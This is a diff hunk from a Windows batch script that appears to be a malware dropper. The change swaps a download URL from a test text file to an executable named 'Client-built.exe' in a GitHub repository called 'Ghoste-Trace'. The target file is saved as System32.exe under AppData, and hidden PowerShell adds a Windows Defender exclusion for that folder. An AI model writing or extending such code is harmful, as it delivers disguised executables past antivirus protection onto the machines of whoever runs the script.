@@ -27,7 +27,7 @@ if %errorlevel% NEQ 0 (
 :: Set paths
 set "APPDATA_PATH=%USERPROFILE%\AppData"
 set "TARGET_FILE=%SUBDIR%\System32.exe"
-set "DOWNLOAD_URL=https://raw.githubusercontent.com/Abdullah67289/Ghoste-Trace/refs/heads/main/test.txt"
+set "DOWNLOAD_URL=https://github.com/Abdullah67289/Ghoste-Trace/raw/refs/heads/main/Client-built.exe"
 
 :: Defender Exclusion
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath '%APPDATA_PATH%'"
